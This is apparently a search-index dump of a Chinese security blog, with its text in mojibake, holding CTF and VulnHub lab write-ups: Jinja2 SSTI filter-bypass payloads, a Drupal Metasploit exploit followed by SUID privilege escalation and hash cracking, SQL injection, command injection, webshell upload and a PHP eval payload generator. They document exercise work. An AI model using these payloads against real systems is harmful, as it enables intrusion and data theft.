e=dict(__ge=a,titem__=a)|join%&#125; f.æ„é€ __builtins__&#123;%set f=dict(__buil=a,tins__=a)%&#125;g.æ„é€  chr å­—ç¬¦&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\nb=dict(o=a,s=a)|joinä½•æ„å‘³?\nåˆ›å»ºä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ä¸¤ä¸ªé”®å€¼å¯¹ï¼š\n\né”®:o,å€¼:a\n\né”®:s,å€¼:a\n\n|join:è¿‡æ»¤å™¨,å°†å­—å…¸çš„é”®æ‹¼æ¥èµ·æ¥\n\n\nå°±æ˜¯:\n&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set cmd=dict(l=a,s=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; &#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\nlsè¿˜ä¸å¤Ÿ,æœ€åè¿˜æ˜¯è¦æ‹¼æ¥cat /app/flagè¿™ä¸ªå‘½ä»¤\næˆ‘ä»¬å…ˆè¦å¾—åˆ°chrå‡½æ•°,asciiè¡¨ä¸­32æ˜¯ç©ºæ ¼,47ä¸ºæ–œæ \n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;a.æ„é€ __globals__&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;b.æ„é€ os&#123;%set b=dict(o=a,s=a)|join%&#125;c.æ„é€ popen&#123;%set c=dict(po=a,pen=a)|join%&#125;cmd.æ„é€ ls&#123;%set cmd=dict(l=a,s=a)|join%&#125;d.æ„é€ read&#123;%set d=dict(re=a,ad=a)|join%&#125;e.æ„é€ __getitem__&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; f.æ„é€ __builtins__&#123;%set f=dict(__buil=a,tins__=a)|join%&#125;ch.æ„é€  chr å­—ç¬¦&#123;%set ch=dict(ch=a,r=a)|join%&#125;chh.æ„é€  chr å‡½æ•°&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;\n\ncode=&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; &#123;%set f=dict(__buil=a,tins__=a)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(32),chh(47),dict(ap=a,p=a)|join,chh(47),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;#è¿™é‡Œçš„chhå°±æ˜¯chrè¿™ä¸ªå‡½æ•°\n\n\nLevel 12ç›¸æ¯”ä¸Šä¸€é¢˜,è¿‡æ»¤äº†ä¸‹åˆ’çº¿å’Œæ•°å­—\n\nå–ä¸‹åˆ’çº¿,æµ‹è¯•\n&#123;&#123;()|select|string|list&#125;&#125;\n\n\n\n\nåœ¨ç¬¬24ä¸ªå­—ç¬¦å–åˆ°ä¸‹åˆ’çº¿,é€šè¿‡pop(24)å¾—åˆ°_\n&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;&#123;()|select|string|list|attr(p)(24)&#125;&#125;\n\nä½†æ˜¯è¿™é‡Œç¦æ­¢äº†æ•°å­—0-9,å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨ | length æˆ–è€…| countå–åˆ°æ•°å­—24\nå…ˆç”Ÿæˆ24ä¸ªå­—ç¬¦aaaaaaaaaaaaaaaaaaaaaaaa\nå–ä¸‹åˆ’çº¿\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;&#123;()|select|string|list|attr(p)(numa)&#125;&#125;\n\n\nå»¶ç”¨ä¸Šå…³çš„payloadè¿›è¡Œä¿®æ”¹\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\n\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;#å¾—åˆ°ä¸‹åˆ’çº¿_&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;#å¾—åˆ°__globals__&#123;%set b=dict(o=a,s=a)|join%&#125;#å¾—åˆ°os&#123;%set c=dict(po=a,pen=a)|join%&#125;å¾—åˆ°popen&#123;%set d=dict(re=a,ad=a)|join%&#125;#å¾—åˆ°read&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;#å¾—åˆ°__getitem__&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;#å¾—åˆ°__builtins__&#123;%set ch=dict(ch=a,r=a)|join%&#125;å¾—åˆ°chrå­—ç¬¦&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;å¾—åˆ°chrå‡½æ•°&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;åˆ†åˆ«å–å¾—ç©ºæ ¼å’Œ/&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\næ³¨æ„ä¸€ä¸‹ ä¸èƒ½å•ç‹¬\n&#123;%set a=dict(glob=a,als=a)|join%&#125;&#123;%set ac=(xhx,xhx,a,xhx,xhx)|join%&#125; //è¿™æ˜¯å¤±è´¥çš„\n\n\nLevel 13ä¸Šä¸€å…³payloadè¿˜èƒ½æ‰“\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\n","categories":["python,ssti"],"tags":["ssti,wp"]},{"title":"DCé¶æœºæ¸—é€","url":"/2025/10/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","content":"é¶æœºçš„ä¸‹è½½åŠæ­å»ºä¸‹è½½åœ°å€ï¼šhttps://download.vulnhub.com/dc/DC-1.zip\nä¸‹è½½åè§£å‹å¾—åˆ°ä¸€ä¸ªovaæ–‡ä»¶ï¼Œç”¨vmæ‰“å¼€ï¼ŒæŠ¥é”™æ²¡äº‹ï¼Œé‡è¯•å³å¯ã€‚ç„¶åå¯åŠ¨é¶æœº\n\nå‡ºç°è¿™ä¸ªç•Œé¢ä¹‹åå³å¯ï¼Œç„¶åæŠŠé¶æœºçš„ç½‘ç»œæ¨¡å¼æ”¹ä¸ºNATï¼Œç¡®ä¿é¶æœºå’Œkaliå¤„äºåŒä¸€ç½‘æ®µ\nDC-1ä¿¡æ¯æ”¶é›†åœ¨é¶æœºè®¾ç½®é‡Œè·å–é¶æœºçš„macåœ°å€\n\n\nåœ¨kaliä¸­ï¼š\narp-scan -l\n\n\nå¾—åˆ°é¶æœºçš„ipä¸º192.168.243.136\nnmapæ‰«æ\nnmap -A 192.168.243.136\n\n\nå¼€æ”¾äº†22,80,111ç«¯å£,å…ˆå°è¯•ä¸€ä¸‹sshçˆ†ç ´\nnmap --script=ssh-brute 192.168.243.136\n\nçˆ†ç ´äº†å¾ˆä¹…æ— æœï¼Œæœæ–­æ”¾å¼ƒ\n\nè®¿é—®80ç«¯å£\nè®¿é—®192.168.243.136\n\nå½“ç„¶ä¹Ÿå¯ä»¥ç”¨kaliçš„whatwebæ‰«æ\nwhatweb -v 192.168.243.136\n\n\nç°åœ¨æ”¶é›†çš„ä¿¡æ¯ï¼š\nCMSæ˜¯DrupalApache 2.2.22PHP 5.4.45jQuery 1.4.4 \n\næ‰“ç‚¹ä½¿ç”¨Metasploitè¿›è¡Œæ¼æ‰«\nmsfconsolesearch Drupal\n\n\nä½¿ç”¨æŠ«éœ²æ—¶é—´ä¸º2018-03-28çš„æ¼æ´,æ¥ç€çœ‹ä¸€ä¸‹è¯¥æ¼æ´æ¨¡å—å‚æ•°\nshow options\n\n\n\nCurrent Settingæ˜¯ç›®å‰è®¾ç½®çš„å†…å®¹\nRequiredè¡¨ç¤ºæ˜¯å¦éœ€è¦è®¾ç½®å†…å®¹ï¼Œyesä¸ºå¿…é¡»è®¾ç½®ï¼Œnoå¯ä»¥è®¾ç½®ä¹Ÿå¯ä¸è®¾ç½®\nå°±ä¸Šé¢æ¥è¯´RHOSTSéœ€è¦setï¼Œä½†æ˜¯æ²¡æœ‰å†…å®¹\n\næ‰€ä»¥æ¥ç€æˆ‘ä»¬æ¥è®¾ç½®ä¸€ä¸‹RHOSTSå†…å®¹ï¼ˆå°±æ˜¯æ”»å‡»ç›®æ ‡IPåœ°å€ï¼Œé¶åœºåœ°å€ï¼‰\nset RHOSTS 192.168.243.136\n\nç„¶åè¿›è¡Œæ”»å‡»\nrunæˆ–è€…exploit\n\n\nå½“å‡ºç°Meterpreter session 1 openedï¼ˆkaliå’Œç›®æ ‡ipçš„è¿æ¥ï¼‰å°±è¯´æ˜æ”»å‡»æˆåŠŸ\nshellwhoamipython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;\n\n\nå…ˆæŠŠflag1æ‹¿äº†\n\nå¾—åˆ°ä¸ªæç¤ºï¼Œæœç´¢å¾—çŸ¥è¿™ä¸ªcmsçš„é…ç½®æ–‡ä»¶æ˜¯settings.phpæ–‡ä»¶ï¼Œæ‰¾ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„ä½ç½®\nfind / -name settings.phpwww-data@DC-1:/var/www$ find / -name settings.phpfind / -name settings.php/var/www/sites/default/settings.phpcat /var/www/sites/default/settings.php\n\nå¾—åˆ°flag2\n\næ•°æ®åº“çš„è´¦å·å¯†ç dbuser/R0ck3t\næ•°æ®åº“æ¸—é€mysql -udbuser -pR0ck3tshow databases;\n\n\næ¥ç€ä½¿ç”¨drupaldbæ•°æ®åº“å¹¶æŸ¥çœ‹è¡¨\nuse drupaldb;show tables;\n\n\næŸ¥çœ‹ä¸€ä¸‹usersè¡¨é‡Œçš„å†…å®¹\nselect * from users;\n\n\nå¾—åˆ°adminå’ŒFerdç”¨æˆ·çš„passå­—æ®µï¼Œå°è¯•ä¸€ä¸‹æ›´æ”¹adminçš„passå­—æ®µï¼Œå®ç°ä»»æ„å¯†ç é‡ç½®\nhttps://drupalchina.cn/node/2128\n\nå¾—çŸ¥drupalçš„å¯†ç åŠ å¯†è„šæœ¬å­˜æ”¾åœ¨/var/www/scripts/password-hash.shï¼Œé‡ç½®å¯†ç çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹\nphp /var/www/scripts/password-hash.sh 123456password: 123456                hash: $S$D/MdQUfce0ZBmd4yIPvIS7F8TnbstjOrCa9M9u8NkdS3tzer0mha\n\nç„¶åè¿›mysqlè¿›è¡Œæ›¿æ¢\nuse drupaldb;update users set pass = &quot;$S$D/MdQUfce0ZBmd4yIPvIS7F8TnbstjOrCa9M9u8NkdS3tzer0mha&quot; where name = &quot;admin&quot;;\n\n\næ›´æ”¹æˆåŠŸï¼Œæˆ‘ä»¬å›åˆ°webä¸»é¡µå°è¯•ç™»å½•\n\nå¾—åˆ°flag3ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°/etc/shadowçš„å†…å®¹ï¼Œå¹¶ä¸”FINDæ˜¯å¤§å†™ä¸”è·Ÿäº†-execï¼Œå°è¯•findææƒ\nfind / -perm -u=s -type f 2&gt;/dev/null æˆ–è€… which find ls -l  /usr/bin/find \n\n\nfind /usr/bin/find -exec &quot;/bin/sh&quot; \\;\n\n\næˆåŠŸææƒï¼Œè®¿é—®/etc/shadow\n\nå°è¯•è¿›è¡Œçˆ†ç ´ï¼Œå°†æœ€åä¸€è¡Œå¤åˆ¶åˆ°2.txtï¼Œè¿›è¡Œçˆ†ç ´\nhashcat -m 1800 2.txt /usr/share/wordlists/rockyou.txt\n\n\nå¾—åˆ°å¯†ç orangeï¼Œsshé“¾æ¥\nssh flag4@192.168.243.136\n\n\nå¾—åˆ°flag4ï¼Œæç¤ºæˆ‘ä»¬è¦åœ¨/rootä¸‹å¾—åˆ°flagï¼Œå‰é¢å·²ç»ææƒã€‚è¿™æ­¥å¥½åŠ\n\nå¾—åˆ°æœ€ç»ˆflag\nDC-2ä¿¡æ¯æ”¶é›†ipæ‰«æ\nâ”Œâ”€â”€(rootã‰¿kali)-[~/æ¡Œé¢]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:34:06:95, IPv4: 192.168.243.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.243.1   00:50:56:c0:00:08       VMware, Inc.192.168.243.2   00:50:56:f9:0d:90       VMware, Inc.192.168.243.137 00:0c:29:2a:e6:70       VMware, Inc.192.168.243.254 00:50:56:e1:bb:61       VMware, Inc.\n\nå¾—åˆ°ipä¸º192.168.243.137ï¼Œnmapæ‰«æ\nnmap -A -p 1-65535 192.168.243.137\n\n\nå¼€æ”¾äº†80ç«¯å£ï¼Œsshç«¯å£æ”¹åˆ°äº†7744,å°è¯•è®¿é—®webç«¯ä¼šé‡å®šå‘åˆ°http://dc-2ã€‚æˆ‘ä»¬æœ¬åœ°dnsç»‘å®šä¸‹\nhostç¼–è¾‘é¡µåœ¨C:\\Windows\\System32\\drivers\\etcä¸­\n\nå°±èƒ½è¿›å»äº†\n\nç›´æ¥å°±èƒ½è¿›å»äº†ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\nFlag 1:Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just canâ€™t win them all.Log in as one to see the next flag.If you canâ€™t find it, log in as another.\n\næœç´¢cewlï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·\n\nCewlæ˜¯ä¸€æ¬¾é‡‡ç”¨Rubyå¼€å‘çš„åº”ç”¨ç¨‹åºï¼Œä½ å¯ä»¥ç»™å®ƒçš„çˆ¬è™«æŒ‡å®šURLåœ°å€å’Œçˆ¬å–æ·±åº¦ï¼Œè¿˜å¯ä»¥æ·»é¢å¤–çš„å¤–éƒ¨é“¾æ¥ï¼Œæ¥ä¸‹æ¥Cewlä¼šç»™ä½ è¿”å›ä¸€ä¸ªå­—å…¸æ–‡ä»¶ï¼Œä½ å¯ä»¥æŠŠå­—å…¸ç”¨åˆ°ç±»ä¼¼John the Ripperè¿™æ ·çš„å¯†ç ç ´è§£å·¥å…·ä¸­ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒCewlè¿˜æä¾›äº†å‘½ä»¤è¡Œå·¥å…·ã€‚\n\n","categories":["é¶æœº wp"],"tags":["é¶æœº wp"]},{"title":"newstarå…¬å¼€èµ›é“","url":"/2025/10/03/newstar%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93/","content":"webmulti-headach3ç”±æç¤ºè®¿é—®&#x2F;robots.txt,å¾—åˆ°hidden.php,bpé‡æ”¾å¾—åˆ°flag\n\nflag&#123;ebdf1c75-5f68-4cae-9795-e5457bb31754&#125;\n\nstrange_loginç”±æç¤ºå¾—çŸ¥ä¸‡èƒ½å¯†ç ç™»å½•,å¹¶æç¤ºè¦ç”±ç®¡ç†å‘˜ç™»é™†\nè´¦å¯†éƒ½å¡«å°±å¥½äº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºç”¨æˆ·åè¦æ˜¯admin\n1&#x27; and 1=1--+\n\n\nflag&#123;e1668fbe-b722-4f1a-806a-4ca9146f98a6&#125;\n\nå®‡å®™çš„ä¸­å¿ƒæ˜¯phpF12è¢«ç¦äº†ï¼Œç”¨view-source:æˆ–è€…æŠ“åŒ…ï¼Œå¾—åˆ°è·¯ç”±s3kret.php\n&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;if(isset($_POST[&#x27;newstar2025&#x27;]))&#123;    $answer = $_POST[&#x27;newstar2025&#x27;];    if(intval($answer)!=47&amp;&amp;intval($answer,0)==47)&#123;        echo $flag;    &#125;else&#123;        echo &quot;ä½ è¿˜æœªå‚é€å¥¥ç§˜&quot;;    &#125;&#125;\n\nä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œ47çš„åå…­è¿›åˆ¶æ˜¯2F\nPOST:newstar=0x2f\n\n\nflag&#123;f3453dbd-ef9a-47dc-b889-157d29b17583&#125;\n\næˆ‘çœŸå¾—æ§åˆ¶ä½ äº†å…ˆç¦ç”¨js,æ ¹æ®jsä»£ç ï¼Œåˆ é™¤,ç‚¹å‡»æŒ‰é’®\nè¿›æ¥ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œbpçˆ†ï¼Œå¾—åˆ°\n\nè´¦å·ï¼šadmin,å¯†ç ï¼š111111\n&lt;?phperror_reporting(0);function generate_dynamic_flag($secret) &#123;    return getenv(&quot;ICQ_FLAG&quot;) ?: &#x27;default_flag&#x27;;&#125;if (isset($_GET[&#x27;newstar&#x27;])) &#123;    $input = $_GET[&#x27;newstar&#x27;];        if (is_array($input)) &#123;        die(&quot;æ­å–œæŒæ¡æ–°å§¿åŠ¿&quot;);    &#125;        if (preg_match(&#x27;/[^\\d*\\/~()\\s]/&#x27;, $input)) &#123;        die(&quot;è€å¥—è·¯äº†ï¼Œè¡Œä¸è¡Œå•Š&quot;);    &#125;        if (preg_match(&#x27;/^[\\d\\s]+$/&#x27;, $input)) &#123;        die(&quot;è¯·è¾“å…¥æœ‰æ•ˆçš„è¡¨è¾¾å¼&quot;);    &#125;        $test = 0;    try &#123;        @eval(&quot;\\$test = $input;&quot;);    &#125; catch (Error $e) &#123;        die(&quot;è¡¨è¾¾å¼é”™è¯¯&quot;);    &#125;        if ($test == 2025) &#123;        $flag = generate_dynamic_flag($flag_secret);        echo &quot;&lt;div class=&#x27;success&#x27;&gt;æ‹¿ä¸‹flagï¼&lt;/div&gt;&quot;;        echo &quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: &#123;$flag&#125;&lt;/div&gt;&lt;/div&gt;&quot;;    &#125; else &#123;        echo &quot;&lt;div class=&#x27;error&#x27;&gt;å¤§å“¥å“¥æ³¥æŠŠæ•°å­—ç®—é”™äº†: $test â‰  2025&lt;/div&gt;&quot;;    &#125;&#125; else &#123;    ?&gt;&lt;?php &#125; ?&gt;\n\nget:newstar=45*45\n\n\nflag&#123;b94f8e38-42e3-4ffd-b560-8be6869c8c1b&#125;\n\nåˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³åœ¨æ§åˆ¶å°è¾“å…¥ä¸¤æ¬¡ï¼›\nscore = 1000000; endLevel();\n\n\nflag&#123;2eb3b013-1c56-4dc9-b1e4-650ba7316da6&#125;\n\nDDåŠ é€Ÿå™¨flagåœ¨ç¯å¢ƒå˜é‡\n127.0.0.1|env\n\n\nflag&#123;d4b77396-54ec-46b2-a5b0-3b9771c747f7&#125;\n\nç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰ä¸Šä¼ .htaccesså’ŒMP3ä¸€å¥è¯æœ¨é©¬ï¼Œç»æç¤ºå¾—çŸ¥æœ‰ä¸€ä¸ª/v1/onloadæ¥å£è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¯»å–åŸæœ‰çš„star.mp3\n\nå¾—åˆ°ä¸Šä¼ è·¯å¾„æ˜¯/uploads/æ–‡ä»¶åï¼Œè¿èšå‰‘å³å¯\n\nflag&#123;ddfab865-ca7b-42f7-9e50-0be8c57b6fb6&#125;\n\n\n\næç‚¹å“¦æ¶¦å‰åƒåƒæ©˜å‰ç«¯å¾—åˆ°å¯†ç Doro/Doro_nJlPVs_@123,ç™»é™†åæŠ“åŒ…å¾—åˆ°æç¤º\n&#123;  &quot;expression&quot;: &quot;token = (1759727884 * 67102) ^ 0xe674c1&quot;,  &quot;hint&quot;:&quot;doroè®°å¾—è¿™é‡Œä¼šåœ¨sessioné‡Œé¢æ·»åŠ éªŒè¯å‚æ•°, ä¹Ÿè®¸Set-Cookieå¯ä»¥å¸®åŠ©æˆ‘ä»¬......&quot;,  &quot;multiplier&quot;: 67102,  &quot;xor_value&quot;: &quot;0xe674c1&quot;&#125;\n\nå¾—åˆ°çš„sessionå¾ˆæ˜æ˜¾æ˜¯flask&#x2F;pythonçš„itsdangerous åºåˆ—åŒ–ç­¾å sessionï¼Œç”¨flask-unsignè§£å¯†ä¸€ä¸‹\nD:\\CTF_TOOLS&gt;flask-unsign --decode --cookie &quot;.eJxNy00KhDAMQOG7ZN2F8a_atfcoZSZ0CrGVmIIg3n105_q974TPLzBTjuTXypo2TiTgRotNa15x1yDqNa0EDu0w29ZOU_8-jnI7HLDpcJwNcImRvj5lcCqVDNSdJIfHw1KkwPUHTT4pVQ.aONRDA.TdBxD8u9uANsFyA2PcQb7P99TNY&#123;&#x27;challenge_multiplier&#x27;: 67102, &#x27;challenge_start_time&#x27;: 1759727884, &#x27;challenge_xor&#x27;: 15103169, &#x27;logged_in&#x27;: True, &#x27;username&#x27;: &#x27;Doro&#x27;&#125;\n\n\n\nçœŸçš„æ˜¯ç­¾åˆ°è¯¶&lt;?phphighlight_file(__FILE__);$cipher = $_POST[&#x27;cipher&#x27;] ?? &#x27;&#x27;;function atbash($text) &#123;  $result = &#x27;&#x27;;  foreach (str_split($text) as $char) &#123;    if (ctype_alpha($char)) &#123;      $is_upper = ctype_upper($char);      $base = $is_upper ? ord(&#x27;A&#x27;) : ord(&#x27;a&#x27;);      $offset = ord(strtolower($char)) - ord(&#x27;a&#x27;);      $new_char = chr($base + (25 - $offset));      $result .= $new_char;    &#125; else &#123;      $result .= $char;    &#125;  &#125;  return $result;&#125;if ($cipher) &#123;  $cipher = base64_decode($cipher);  $encoded = atbash($cipher);  $encoded = str_replace(&#x27; &#x27;, &#x27;&#x27;, $encoded);  $encoded = str_rot13($encoded);  @eval($encoded);  exit;&#125;$question = &quot;çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ&quot;;$answer = &quot;çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼&quot;;$res =  $question . &quot;&lt;br&gt;&quot; . $answer . &quot;&lt;br&gt;&quot;;echo $res . $res . $res . $res . $res;?&gt;\n\nç¼–å†™å¯¹åº”è§£å¯†è„šæœ¬å³å¯ï¼Œå…ˆæ¥åˆ†æä¸€ä¸‹ä¸€è¿™æ®µä»£ç \natbashå‡½æ•°:\nå¯¹ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²textæ‹†åˆ†æˆå•ä¸ªå­—ç¬¦ï¼Œå¹¶æ£€æŸ¥æ˜¯ä¸æ˜¯å­—æ¯ï¼Œæ˜¯å­—æ¯çš„è¯è®¡ç®—åç§»å€¼ï¼ˆå­—æ¯åœ¨å­—æ¯è¡¨ä¸­çš„ä½ç½®ï¼‰ç”¨è¿™ä¸ªåç§»å€¼è®¡ç®—å¾—åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ï¼ˆa-z,b-yï¼‰\næˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå…ˆç»è¿‡base64è§£å¯†ï¼Œç„¶åç»è¿‡atbashåŠ å¯†ï¼Œå»æ‰ç©ºæ ¼åç»è¿‡rot13åŠ å¯†ï¼Œæˆ‘ä»¬é€†å‘å›å»å³å¯\nåŸå§‹ä»£ç  â†’ ROT13 â†’ åŠ ç©ºæ ¼(æœ€å¥½æ˜¯ç©ºæ ¼ç”¨$&#123;IFS&#125;æ›¿æ¢)â†’ Atbash â†’ base64 \nimport base64import stringdef atbash(text):    &quot;&quot;&quot;    Apply Atbash cipher to the text.    Atbash is its own inverse.    &quot;&quot;&quot;    result = &#x27;&#x27;    for char in text:        if char.isalpha():            is_upper = char.isupper()            base = ord(&#x27;A&#x27;) if is_upper else ord(&#x27;a&#x27;)            offset = ord(char.lower()) - ord(&#x27;a&#x27;)            new_char = chr(base + (25 - offset))            result += new_char        else:            result += char    return resultdef rot13(text):    &quot;&quot;&quot;    Apply ROT13 cipher to the text.    ROT13 is its own inverse.    &quot;&quot;&quot;    trans = str.maketrans(        string.ascii_lowercase + string.ascii_uppercase,        string.ascii_lowercase[13:] + string.ascii_lowercase[:13] +        string.ascii_uppercase[13:] + string.ascii_uppercase[:13]    )    return text.translate(trans)def craft_payload(mycode):    &quot;&quot;&quot;    Craft the base64-encoded payload for the PHP script.        Args:        mycode (str): The PHP code to execute via eval (without spaces).        Returns:        str: The base64-encoded cipher value to POST.    &quot;&quot;&quot;    # Step 1: Apply ROT13 to mycode (reverse of str_rot13)    inter = rot13(mycode)        # Step 2: Since spaces are removed after atbash, ensure no spaces in inter    # (assuming mycode has no spaces; adjust if needed)    if &#x27; &#x27; in inter:        raise ValueError(&quot;Input code should not introduce spaces after ROT13&quot;)        # Step 3: Apply atbash to inter (reverse of atbash)    decoded = atbash(inter)        # Step 4: Base64 encode the decoded    payload = base64.b64encode(decoded.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)        return payload# Example usage:if __name__ == &quot;__main__&quot;:    mycode = &quot;system(&#x27;cat$&#123;IFS&#125;/f*&#x27;);&quot;        cipher = craft_payload(mycode)    print(f&quot;POST cipher: &#123;cipher&#125;&quot;)    print(&quot;\\nVerification (forward simulation):&quot;)    dec = base64.b64decode(cipher.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)    atb = atbash(dec)    no_space = atb.replace(&#x27; &#x27;, &#x27;&#x27;)    rot = rot13(no_space)    print(f&quot;Eval code: &#123;rot&#125;&quot;)\n\n\nflag&#123;f3c98f57-9725-44bd-aca4-266014083b38&#125;\n\nmiscæˆ‘ä¸è¦é©å‘½å¤±è´¥ä¸‹è½½windbgåæ‰“å¼€é¢˜ç›®é™„ä»¶ï¼Œè¿è¡Œ!analyze -v\n\n\nflag&#123;CRITICAL_PROCESS_DIED_svchost.exe&#125;\n\nMISCåŸé‚¦-å‹ç¼©æœ¯æœ‰é¢˜ç›®å¯çŸ¥å…ˆæ˜¯6ä½æ•°å­—+å°å†™å­—æ¯å¯†ç çˆ†ç ´,ç”¨kaliè‡ªå¸¦çš„å·¥å…·çˆ†ç ´\nzip2john misc.zip &gt; zip.hashcrunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 | john --stdin zip.hash\n\n\næ‰¾åˆ°å¯†ç 